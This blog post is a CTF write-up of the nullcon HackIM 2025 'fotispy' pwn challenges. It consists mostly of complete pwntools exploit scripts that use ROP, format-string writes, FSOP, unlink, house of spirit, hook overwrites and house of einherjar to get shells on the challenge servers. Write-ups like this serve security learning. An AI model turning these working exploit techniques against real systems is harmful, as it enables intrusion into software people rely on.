---
date: 2025-08-10 10:21:59
layout: post
title: pwning thru the night
subtitle: nailing down pwn challenges in nullcon 2025 (but only after the challenges ended)
description: >-
    first time playing solo with my awesome bf xd
image: >-
  /assets/img/uploads/silver_wolf_warp.png
optimized_image: >-
  /assets/img/uploads/silver_wolf_warp.png
category: ctf
tags:
  - heap challenges
  - format string
author: rosayxy
paginate: true
---

This Thursday, my bf was playing the nullcon HackIM CTF solo as team jiegec and I decided to take a look too. However, I have *professional practice* during the day (which is like being an intern in a company), so I could only play at night. I did the `fotispy1` challenge, got stuck on `fotispy2` challenge and went to bed. I wasn't avail for the next day either, and when the CTF ended, I was a bit angry at myself, thinking that its the first time me and my boyfriend played solo and I was not much of a help.

That's how I decided to challenge myself to take out as many pwn challenges as I can in one day and in the end, I did the 5 pwn challenges left in around 10 hrs (got some help from jiegec for the `fotispy2` chal I was stuck on). Here's the writeup.

## fotispy1
Very basic stack challenge.

```py
from pwn import *
context(log_level = 'debug', arch = "amd64", os = "linux")
# p = process("fotispy1")
p = remote("52.59.124.14", 5191)
libc = ELF("./libc.so.6")

libc_leak = 0
def register(name, passwd):
    p.recvuntil("Please enter your choice [E]: ")
    p.sendline("0")
    p.recvuntil("Please enter a username: ")
    p.sendline(name)
    p.recvuntil("Please enter a password: ")
    p.sendline(passwd)

def login(name, passwd):
    p.recvuntil("Please enter your choice [E]: ")
    p.sendline("1")
    p.recvuntil("Please enter a username: ")
    p.sendline(name)
    p.recvuntil("Please enter a password: ")
    p.sendline(passwd)

def add_song():
    global libc_leak
    p.recvuntil("Please enter your choice [E]: ")
    p.sendline("2")
    p.recvuntil("[DEBUG] ")
    libc_leak = int(p.recvline().strip(), 16)
    log.info("libc leak: " + hex(libc_leak))
    libc_base = libc_leak - libc.symbols["printf"]
    log.info("libc base: " + hex(libc_base))
    pop_rdi_ret = libc_base + 0x277e5
    system = libc_base + libc.symbols["system"]
    binsh = libc_base + next(libc.search(b"/bin/sh"))
    ret = pop_rdi_ret + 1
    payload = b"a"*13 + p64(0x4040c0) +p64(0) + p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system) + p64(0)
    p.recvuntil("Please enter a song title: ")
    p.sendline("aaa")
    p.recvuntil("is from: ")
    p.sendline(b"aaa")
    p.recvuntil("is on: ")
    p.sendline(payload)


register("rosa", "123")
login("rosa", "123")
add_song()
# gdb.attach(p)
# pause()
p.recvuntil("Please enter your choice [E]: ")
p.sendline("3")
p.interactive()
```


## fotispy2
This seems to be a format string challenge, but it checks whether the input contains `%` and gives an error if it does. The main logic is as below

```c
void __fastcall create(__int64 a1)
{
  unsigned __int8 v1; // [rsp+1Bh] [rbp-15h]
  int v2; // [rsp+1Ch] [rbp-14h]
  int v3; // [rsp+20h] [rbp-10h]
  char *ptr; // [rsp+28h] [rbp-8h]

  if ( cur_user_idx == -1 )
  {
    puts("[-] No user has logged in yet.");
  }
  else
  {
    ptr = (char *)calloc(0xA2Cu, 1u);
    printf("[~] Please enter a song title: ");
    v2 = getline((__int64)ptr, 0x500);
    printf("[~] Please enter a who %s is from: ", ptr);
    v3 = getline((__int64)(ptr + 0x504), 0x500);
    printf("[~] Please enter which album %s is on: ", ptr + 0xA0C);
    *((_DWORD *)ptr + 642) = getline((__int64)(ptr + 2572), 32);
    *((_DWORD *)ptr + 320) = v2;
    *((_DWORD *)ptr + 641) = v3;
    v1 = *(_BYTE *)(41688LL * (unsigned __int8)cur_user_idx + a1 + 17);
    if ( v1 <= 0xFu )
    {
      memcpy((void *)(a1 + 0xA2D8LL * (unsigned __int8)cur_user_idx + 0xA2CLL * v1 + 16 + 4), ptr, 0xA2Cu);
      if ( strchr(ptr, '%') || strchr(ptr + 0x504, '%') || strchr(ptr + 0xA0C, '%') )
      {
        puts("[-] Found an illegal character :(");
        free(ptr);
      }
      else
      {
        ++*(_BYTE *)(41688LL * (unsigned __int8)cur_user_idx + a1 + 17);
      }
    }
    else
    {
      free(ptr);
      puts("[-] Favorites are full :(");
    }
  }
}
```

I was stuck on how to bypass the `%` check. Then jiegec told me that though the `%` is filtered, and the cnt will not increase, but the `ptr + 0xA0C` string is not null-terminated, so when it is used as format string, it will continue to print the `title` in the next song. And if we have a format string in the title of the next song, we can use that to leak addresses and do writes.

Also, when I got the leaks and try for a rop, it fails by that it will cover up the cnt of the songs and will print our format string **twice**, so I resolve to do the classic house of apple 2 thing and use FSOP to solve.

```py
from pwn import *
context(log_level = 'debug', arch = "amd64", os = "linux")
# p = process("fotispy2")
p = remote("52.59.124.14", 5192)
libc = ELF("./libc.so.6")

libc_leak = 0
def register(name, passwd):
    p.recvuntil("Please enter your choice [4]: ")
    p.sendline("0")
    p.recvuntil("Please enter a username: ")
    p.sendline(name)
    p.recvuntil("Please enter a password: ")
    p.sendline(passwd)

def login(name, passwd):
    p.recvuntil("Please enter your choice [4]: ")
    p.sendline("1")
    p.recvuntil("Please enter a username: ")
    p.sendline(name)
    p.recvuntil("Please enter a password: ")
    p.sendline(passwd)


def exit_proc():
    p.recvuntil("Please enter your choice [4]: ")
    p.sendline("4")

def add_song(title, author, album):
    p.recvuntil("Please enter your choice [4]: ")
    p.sendline("2")
    p.recvuntil("Please enter a song title: ")
    p.sendline(title)    
    p.recvuntil("is from: ")
    p.sendline(author)
    p.recvuntil("is on: ")
    p.send(album)

def show():
    p.recvuntil("Please enter your choice [4]: ")
    p.sendline("3")


register("rosa", "123")
register("rosa1", "123")
login("rosa", "123")
add_song(b"a"*0x10, b"b"*0x10, b"c"*0x20) #0
# 0x7ffc2217c048 0x7ffc22116390
add_song(b" - %6$p - %52125$p", b"d"*0x10, b"e"*0x20) #1

show()
p.recvuntil("Your favorites:\n")
contents = p.recvline().split(b" - ")
stack_leak = int(contents[3], 16)
libc_leak = int(contents[4], 16)
log.info("stack leak: " + hex(stack_leak))
log.info("libc leak: " + hex(libc_leak))
ret_addr = stack_leak - 0x65db0
libc_base = libc_leak - 0x2724a
log.info("libc base: " + hex(libc_base))
system = libc_base + libc.symbols["system"]
io_list_all = libc_base + libc.symbols["_IO_list_all"]

fake_io_addr = stack_leak - 0x64e64 # TODO
fake_io_file=b"  sh;".ljust(0x8,b"\x00") 
fake_io_file+=p64(0)*3+p64(1)+p64(2)
fake_io_file=fake_io_file.ljust(0x30,b"\x00")
fake_io_file+=p64(0)
fake_io_file=fake_io_file.ljust(0x68,b"\x00")
fake_io_file+=p64(system)
fake_io_file=fake_io_file.ljust(0x88,b"\x00")
fake_io_file+=p64(libc_base+0x1d4a00)
fake_io_file=fake_io_file.ljust(0xa0,b"\x00")
fake_io_file+=p64(fake_io_addr)
fake_io_file=fake_io_file.ljust(0xd8,b"\x00")
fake_io_file+=p64(0x1cf0a0 + libc_base) # 使得可以调用 _IO_wfile_overflow
fake_io_file+=p64(fake_io_addr)

fake_io = p64(fake_io_addr)[:6]
start_idx = 0x160 # TODO
payload = ""
for i in range(6):
    byte = fake_io[i]
    val  = byte
    if i == 0:
        val -= 0x20
        if val <= 0:
            val += 0x100
    else:
        val -= fake_io[i-1]
        if val <= 0:
            val += 0x100
    payload += "%{}c%{}$hhn".format(val, start_idx + i)

payload = payload.ljust(0x60, "a")
payload = payload.encode("latin-1")
for i in range(6):
    payload += p64(io_list_all + i)

add_song(payload, fake_io_file, b"c"*0x10 + b"\n")
# gdb.attach(p)
# pause()
show()
exit_proc()
p.interactive()
```

## fotispy3

not hard heap chal. It gives a heap overflow read/write. We can leak heap address directly. 

Also it can allocate a FILE structure on heap. It contains libc-related pointers, so we can leak libc address from there.

Moreover, it gives us permission to create a file in the `/code` dir, write to it and read from it. The read value can overflow into the bss section and cover the pointer that points to where the heap pointers are stored. So we have arbitrary read/write.

I played FSOP after the arbitrary read/write.

```py
from pwn import *
context(log_level = 'debug', arch = "amd64", os = "linux")
# p = process("fotispy1")
# p = process("./fotispy3")
p = remote("52.59.124.14", 5193)
libc = ELF("./libc.so.6")

libc_leak = 0
def register(name, passwd):
    p.recvuntil("Please enter your choice [7]: ")
    p.sendline("0")
    p.recvuntil("Please enter a username: ")
    p.sendline(name)
    p.recvuntil("Please enter a password: ")
    p.sendline(passwd)

def login(name, passwd):
    p.recvuntil("Please enter your choice [7]: ")
    p.sendline("1")
    p.recvuntil("Please enter a username: ")
    p.sendline(name)
    p.recvuntil("Please enter a password: ")
    p.sendline(passwd)


def show():
    p.recvuntil("Please enter your choice [7]: ")
    p.sendline("4")

def add_song(title, author, album):
    p.recvuntil("Please enter your choice [7]: ")
    p.sendline("2")
    p.recvuntil("Please enter a song title: ")
    p.sendline(title)    
    p.recvuntil("is from: ")
    p.sendline(author)
    p.recvuntil("is on: ")
    p.sendline(album)

def show(slot):
    p.recvuntil("Please enter your choice [7]: ")
    p.sendline("3")
    p.recvuntil("Enter the slot of the song to edit: ")
    p.sendline(str(slot))

def open_file(filename):
    p.recvuntil("Please enter your choice [7]: ")
    p.sendline("5")
    p.recvuntil("Please enter the file path: ")
    p.sendline(filename)

def read_file(len):
    p.recvuntil("Please enter your choice [7]: ")
    p.sendline("6")
    p.recvuntil("How many bytes to read: ")
    p.sendline(str(len))

def write_file(len, content):
    p.recvuntil("Please enter your choice [7]: ")
    p.sendline("7")
    p.recvuntil("How many bytes to read: ")
    p.sendline(str(len))
    p.recvuntil("Enter the data: ")
    p.send(content)

def edit_title(slot, title):
    p.recvuntil("Please enter your choice [7]: ")
    p.sendline("4")
    p.recvuntil("Enter the slot of the song to edit: ")
    p.sendline(str(slot))
    p.recvuntil("What do you want to change: ")
    p.sendline("0")
    p.recvuntil("Please enter the new info: ")
    p.sendline(title)

register("rosa", "123")
register("rosa1", "123")
login("rosa", "123")
show(18)
p.recvuntil("Song: ")
heap_leak = u64(p.recv(6).ljust(8, b"\x00"))
log.info("heap leak: " + hex(heap_leak))
heap_base = heap_leak - 0x720
log.info("heap base: " + hex(heap_base))

open_file("/code/rosa")
show(0x26)
p.recvuntil("Song: \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 - ")
libc_leak = u64(p.recv(6).ljust(8, b"\x00"))
log.info("libc leak: " + hex(libc_leak))
libc_base = libc_leak - 0x1d3680
log.info("libc base: " + hex(libc_base))

io_list_all = libc_base + 0x1d3660
io_wfile_jumps = libc_base + 0x1CF0A0
# construct vtable
fake_io_addr = heap_base + 0x320 # TODO
fake_user_addr = fake_io_addr + 0x130
add_song("  sh;".ljust(8, "\x00") + "\x00"*8, p64(0)*2, p64(1) + p64(2))
add_song(p32(0) + p64(libc_base + libc.symbols["system"]) + p32(0), p64(0)*2, p64(0)*2)
add_song(p64(0)*2, p64(0)*2, p64(0) + p64(fake_io_addr + 0x30))
add_song(p64(0)*2, p64(0)*2, p32(0) + p64(io_wfile_jumps) + p32(0))
add_song(p64(0)*2, p64(0)*2, p64(fake_io_addr - 0x28) + p64(0))
add_song(p32(0) + p64(io_list_all - 0x20), b"aaa", b"aaa")
payload = b"a"*0x30 + p64(fake_user_addr)
write_file(len(payload), payload)
read_file(0x38)

edit_title(0, p64(fake_io_addr))
# gdb.attach(p)
# pause()
p.recvuntil("Please enter your choice [7]: ")
p.sendline("8")

p.interactive()
```

## fotispy4

a libc 2.23 challenge with UAF. The binary is not PIE and there are heap pointers on bss, so we can do the classic unlink attack.

A tip to mark: the chunk containing the fake chunk should not be freed or we will encounter some strange errors.

```py
from pwn import *
context(log_level = 'debug', arch = "amd64", os = "linux")
# p = process("fotispy1")
# p = process("./fotispy4")
p = remote("52.59.124.14", 5194)
libc = ELF("./libc-2.23.so")

def create_user(user, passwd):
    p.recvuntil("Choice: ")
    p.sendline("0")
    p.recvuntil("name: ")
    p.sendline(user)
    p.recvuntil("password: ")
    p.sendline(passwd)

def switch_user(idx):
    p.recvuntil("Choice: ")
    p.sendline("1")
    p.recvuntil("Please select an index [0-15]: ")
    p.sendline(str(idx))

def edit_user(name, passwd):
    p.recvuntil("Choice: ")
    p.sendline("2")
    p.recvuntil("Enter new name: ")
    p.sendline(name)
    p.recvuntil("Enter new password: ")
    p.sendline(passwd)

def show():
    p.recvuntil("Choice: ")
    p.sendline("3")

def delete_user():
    p.recvuntil("Choice: ")
    p.sendline("4")

create_user("rosa", "123")
create_user("rosa1", "123")
create_user("rosa2", "123")
create_user("rosa3", "123")
create_user("/bin/sh", "123")

switch_user(1)
delete_user()
show()
p.recvuntil("Username: ")
libc_leak = u64(p.recvline().strip().ljust(8, b"\x00"))
log.info("libc leak: " + hex(libc_leak))

switch_user(3)
delete_user()

show()
p.recvuntil("Username: ")
heap_leak = u64(p.recvline().strip().ljust(8, b"\x00"))
log.info("heap leak: " + hex(heap_leak))
heap_base = heap_leak - 0x90
libc_base = libc_leak - 0x3c4b78

create_user("rosa5", "123")
pos = 0x6020C0
switch_user(0)

edit_user(p64(0) + p64(0x81) + p64(pos - 0x18) + p64(pos - 0x10), b"1"*0x40 + p64(0x80)+p64(0x90))

switch_user(5)
delete_user()

# finish unlink
system = libc_base + libc.symbols["system"]
free_hook = libc_base + libc.symbols["__free_hook"]
switch_user(0)
edit_user(p64(0)*3 + p64(0x6020c0) + p64(free_hook), b"a"*0x40)
switch_user(1)
edit_user(p64(system), b"b"*0x40)
switch_user(4)
delete_user()
p.interactive()
```

## fotispy5
Libc 2.23 with UAF, but we can only print the first 3 bytes of a chunk.

Moreover, it gives a gadget of `malloc("/bin/sh")`. Usually we don't write to malloc hooks if we have arb-write primitives. **The only exception is arbitrary alloc attack using house of spirit in libc 2.23**. See the description on [CTF Wiki](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/fastbin-attack/#arbitrary-alloc).

We need another house of spirit attack to leak the full libc address.

Also a bit easy heap feng shui. See the comments in the exp below for details.

```py
from pwn import *
context(log_level = 'debug', arch = "amd64", os = "linux")
# p = process("fotispy1")
# p = process("./fotispy5")
p = remote("52.59.124.14", 5195)
libc = ELF("./libc.so.6")

def add_song(comment_len, comment):
    p.recvuntil("Choice: ")
    p.sendline("2")
    p.recvuntil("How long will the comment be: ")
    p.sendline(str(comment_len))
    p.recvuntil("Enter the comment: ")
    p.sendline(comment)

def edit_comment(idx, comment_len, comment):
    p.recvuntil("Choice: ")
    p.sendline("3")
    p.recvuntil("Which song to you want to select: ")
    p.sendline(str(idx))
    p.recvuntil("How long will the new comment be: ")
    p.sendline(str(comment_len))
    p.recvuntil("Enter the new comment: ")
    p.sendline(comment)

def delete(idx):
    p.recvuntil("Choice: ")
    p.sendline("4")
    p.recvuntil("Which song to you want to select: ")
    p.sendline(str(idx))

def view(idx):
    p.recvuntil("Choice: ")
    p.sendline("6")
    p.recvuntil("Which song to you want to select: ")
    p.sendline(str(idx))

# choice l for likes, d for dislikes, s for length
def edit(idx, choice, content):
    p.recvuntil("Choice: ")
    p.sendline("7")
    p.recvuntil("Which song to you want to select: ")
    p.sendline(str(idx))
    p.recvuntil("[~] Choice: ")
    p.sendline(choice)
    p.recvuntil("What is the new value [0-255]: ")
    p.sendline(str(content))

add_song(0x500, b"A"*0x500) #0
add_song(0x60, b"B"*0x40)   #1
add_song(0x60, b"C"*0x40)   #2
add_song(0x60, b"D"*0x40)   #3
add_song(0x60, b"E"*0x40)   #4
delete(0)
view(0)
p.recvuntil("You Song has ")
least_byte = int(p.recvline().split(b" ")[0])
log.info("least byte: " + hex(least_byte))
p.recvuntil("You Song has ")
snd_byte = int(p.recvline().split(b" ")[0])
log.info("second byte: " + hex(snd_byte))
p.recvuntil("You Song is ")
trd_byte = int(p.recvline().split(b" ")[0])
log.info("third byte: " + hex(trd_byte))
libc_leak_lower = least_byte + (snd_byte << 8) + (trd_byte << 16)
faking_addr = libc_leak_lower - 0x83 - 0x8

log.info("libc_leak_lower: " + hex(libc_leak_lower))
delete(1)
delete(2)
view(2)
p.recvuntil("You Song has ")
heap_least_byte = int(p.recvline().split(b" ")[0])
log.info("heap least byte: " + hex(heap_least_byte))
p.recvuntil("You Song has ")
heap_snd_byte = int(p.recvline().split(b" ")[0])
log.info("heap second byte: " + hex(heap_snd_byte))
p.recvuntil("You Song is ")
heap_trd_byte = int(p.recvline().split(b" ")[0])
log.info("heap third byte: " + hex(heap_trd_byte))
heap_lower = heap_least_byte + heap_snd_byte * 0x100 + heap_trd_byte*0x10000
# steps: 1. free victim chunk to fastbin 2. alter its size and free it again to unsorted bin 3. overwrite fd pointer to do fastbin attack
add_song(0x500, b"A"*0x500) # 5
add_song(0x60, b"B"*0x40)   # 6
add_song(0x60, b"C"*0x40)   # 7
add_song(0x50, b"a"*0x40) # 8
add_song(0x50, b"b"*0x40) # 9
delete(1)
delete(2)
delete(8)
delete(9)
edit_comment(1, 0x70, b"b"*0x60 + p64(0xe1)[:-1])

delete(2)
edit_comment(1, 0x69, b"b"*0x60 + p64(0x71))
edit(2, "l", faking_addr%0x100)
edit(2, "d", (faking_addr//0x100)%0x100)

add_song(0x60, b"aaaa") # 10
add_song(0x60, b"aaaa") # 11 **house of spirit chunk here**
edit_comment(1, 0x69, b"b"*0x60 + b"\x00"*3 + p32(0x61)+b"\x00"*1)
edit(2, "l", 0)
edit(2, "d", 0)
edit(2, "s", 0)
log.info("heap_lower" + hex(heap_lower))
edit(9, "l", 0x83)
edit(9, "d", (heap_lower//0x100)%0x100)
add_song(0x50, b"aaaa")
add_song(0x50, b"aaaa")
view(13)

p.recvuntil("You Song has ")
least_byte = int(p.recvline().split(b" ")[0])
log.info("least byte: " + hex(least_byte))
p.recvuntil("You Song has ")
snd_byte = int(p.recvline().split(b" ")[0])
log.info("second byte: " + hex(snd_byte))
p.recvuntil("You Song is ")
trd_byte = int(p.recvline().split(b" ")[0])
log.info("third byte: " + hex(trd_byte))
libc_higher = least_byte + snd_byte*0x100 + trd_byte * 0x10000
log.info(libc_higher)
libc_leak = libc_higher*0x1000000 + libc_leak_lower
log.info("libc_leak: "+hex(libc_leak))
libc_base = libc_leak - 0x3c4b78
log.info("libc_base: "+ hex(libc_base))
system = libc_base  + libc.symbols["system"]
payload = b"a"*11 + p64(system)
edit_comment(11, 19, payload)
p.recvuntil("Choice: ")
p.sendline("8")
# gdb.attach(p)
# pause()
p.interactive()
```

## fotispy6
libc 2.31 with UAF, just write to `__free_hook` and call free on a chunk containing `/bin/sh`.

```py
from pwn import *
context(log_level = 'debug', arch = "amd64", os = "linux")

# p = process("./fotispy6")
p = remote("52.59.124.14", 5196)

libc = ELF("./libc.so.6")

def create_user(user, passwd):
    p.recvuntil("Choice: ")
    p.sendline("1")
    p.recvuntil("Username: ")
    p.sendline(user)
    p.recvuntil("Password: ")
    p.sendline(passwd)

def add_song(comment_len, comment):
    p.recvuntil("Choice: ")
    p.sendline("2")
    p.recvuntil("How long will the comment be: ")
    p.sendline(str(comment_len))
    p.recvuntil("Enter the comment: ")
    p.sendline(comment)

def edit_comment(idx, comment_len, comment):
    p.recvuntil("Choice: ")
    p.sendline("3")
    p.recvuntil("Which song to you want to select: ")
    p.sendline(str(idx))
    p.recvuntil("How long will the new comment be: ")
    p.sendline(str(comment_len))
    p.recvuntil("Enter the new comment: ")
    p.sendline(comment)

def view_comment(idx):
    p.recvuntil("Choice: ")
    p.sendline("4")
    p.recvuntil("Which song to you want to select: ")
    p.sendline(str(idx))

def delete_song(idx):
    p.recvuntil("Choice: ")
    p.sendline("5")
    p.recvuntil("Which song to you want to select: ")
    p.sendline(str(idx))

# do heap leak
add_song(0x40, b"A" * 0x4)
add_song(0x500, b"B" * 0x50)
add_song(0x40, b"C"*0x4)
add_song(0x40, b"/bin/sh\x00")

delete_song(0)
delete_song(1)
delete_song(2)

view_comment(1)
p.recvuntil("Here is your comment:\n")
libc_leak = u64(p.recv(6).ljust(8, b"\x00"))
log.info("libc leak: " + hex(libc_leak))
libc_base = libc_leak - 0x1ecbe0
free_hook = libc_base + libc.symbols["__free_hook"]
view_comment(2)
p.recvuntil("Here is your comment:\n")
heap_leak = u64(p.recv(6).ljust(8, b"\x00"))
log.info("heap leak: " + hex(heap_leak))
heap_base = heap_leak - 0x2a0
edit_comment(2, 0x10, p64(free_hook))
add_song(0x40, b"D"*0x4)
add_song(0x40, p64(libc_base + libc.symbols["system"]))
delete_song(3)
# gdb.attach(p)
# pause()
p.interactive()
```

## fotispy7

We have a UAF but can only do the heap leak. However, we have an off-by-one so the primitives combined gives us a perfect condition for house of einherjar.

```py
from pwn import *
context(log_level = 'debug', arch = "amd64", os = "linux")

# p = process("./fotispy7")
p = remote("52.59.124.14", 5197)
libc = ELF("./libc.so.6")
p.recvuntil("Please enter a username: ")
p.sendline("rosa")
p.recvuntil("Please enter a password: ")
p.sendline("rosa")

def create_playlist(name, desc):
    p.recvuntil("Choice: ")
    p.sendline("2")
    p.recvuntil("Please enter the name of the playlist: ")
    p.sendline(name)
    p.recvuntil("Please enter a fitting description: ")
    p.sendline(desc)

def dbg():
    p.recvuntil("Choice: ")
    p.sendline("10")

def delete_playlist():
    p.recvuntil("Choice: ")
    p.sendline("5")

def create_song(title, album, artist):
    p.recvuntil("Choice: ")
    p.sendline("6")
    p.recvuntil("Please enter the title of the song: ")
    p.sendline(title)
    p.recvuntil("Please enter the album of the song: ")
    p.sendline(album)
    p.recvuntil("Please enter the artist of the song: ")
    p.sendline(artist)

def delete_song(idx):
    p.recvuntil("Choice: ")
    p.sendline("9")
    p.recvuntil("Please enter the index of the song you want to delete: ")
    p.sendline(str(idx))

def edit_song(idx, choice, content):
    p.recvuntil("Choice: ")
    p.sendline("7")
    p.recvuntil("Please enter the index of the song you want to edit: ")
    p.sendline(str(idx))
    p.recvuntil("[T]itle/a[L]bum/a[R]tist: ")
    p.sendline(choice)
    p.recvuntil("of the song: ")
    p.sendline(content)
create_playlist(b"A"*0x20, b"B"*0x20) #0
delete_playlist()
dbg()
p.recvuntil("[000000] ")
leak = int(p.recvline().strip(), 16)
heap_base = leak * 0x1000
log.info("heap base: " + hex(heap_base))

# chunk b 特殊化
create_song(b"a"*0x20, b"B"*0x20, b"c"*0x50 + p64(0x130))
for i in range(10):
    create_song(b"A"*0x20, b"B"*0x20, b"C"*0x20) #1~9

for i in range(7):
    delete_song(i + 2)

fake_chunk_addr = heap_base + 0x390 # TODO
create_playlist("aaaa", b"a"*0xd0 + p64(0) + p64(0x131) + p64(fake_chunk_addr) + p64(fake_chunk_addr)+p64(0)*2)
edit_song(0, "R", b"c"*0x50 + p64(0x130))
delete_song(1)
dbg()
p.recvuntil("[0x0100] ")
libc_leak = int(p.recvline().strip(), 16)
log.info("libc leak: " + hex(libc_leak))
libc_base = libc_leak - 0x1e7d40
log.info("libc base: " + hex(libc_base))

io_list_all = libc_base + libc.symbols["_IO_list_all"]
system = libc_base + libc.symbols["system"]
fake_io_addr = heap_base + 0xbd0 # TODO
fake_io_file=b"  sh;".ljust(0x8,b"\x00") 
fake_io_file+=p64(0)*3+p64(1)+p64(2)
fake_io_file=fake_io_file.ljust(0x30,b"\x00")
fake_io_file+=p64(0)
fake_io_file=fake_io_file.ljust(0x68,b"\x00")
fake_io_file+=p64(system)
fake_io_file=fake_io_file.ljust(0x88,b"\x00")
fake_io_file+=p64(libc_base+0x1e97a0)
fake_io_file=fake_io_file.ljust(0xa0,b"\x00")
fake_io_file+=p64(fake_io_addr)
fake_io_file=fake_io_file.ljust(0xd8,b"\x00")
fake_io_file+=p64(0x1E61C8+libc_base) # 使得可以调用 _IO_wfile_overflow
fake_io_file+=p64(fake_io_addr)

fake_io_file_str = fake_io_file.decode("latin-1")
create_song(fake_io_file_str[:72],fake_io_file_str[72:160], fake_io_file_str[160:]) # 2
create_song(b"A"*0x20, b"B"*0x20, b"C"*0x20) # 2, 3

delete_song(0)
create_playlist(b"aaaa", p64(0) + p64(0x101) + p64(io_list_all^(leak)))
create_song(p64(fake_io_addr), b"B"*0x20, b"C"*0x20)
create_song(p64(fake_io_addr), b"B", b"C")
p.recvuntil("Choice: ")
p.sendline("0")
# gdb.attach(p)
# pause()
p.interactive()
```
